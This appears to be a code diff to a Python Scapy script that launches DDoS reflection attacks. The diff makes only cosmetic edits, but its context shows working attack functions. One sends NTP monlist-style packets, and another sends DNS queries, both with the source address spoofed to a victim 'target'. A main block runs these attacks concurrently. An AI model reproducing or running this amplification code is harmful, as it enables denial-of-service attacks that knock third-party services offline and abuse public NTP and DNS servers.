@@ -27,7 +27,7 @@ def dns_ddos(target, dns_server):
         udp = UDP(dport=5353)
         dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=host, qtype=225))
 
-        request = (ip/udp/dns)
+        request = (ip / udp / dns)
         send(request)
 
 
@@ -36,7 +36,7 @@ def ntp_ddos(target, ntp_server):
     data = "\x17\x00\x03\x2a" + "\x00" * 4
     packet = IP(dst=ntp_server, src=target) / \
         UDP(sport=random.randint(2000, 65535), dport=123)/Raw(load=data)
-    send(packet)  # or add the parameter loop=1
+    send(packet)
 
 
 if __name__ == "__main__":
@@ -55,6 +55,7 @@ if __name__ == "__main__":
             else:
                 futures.append(executor.submit(
                     ntp_ddos, target, ntp_server))
+                
         # Wait for the tasks to complete
         for future in concurrent.futures.as_completed(futures):
             if future.result():
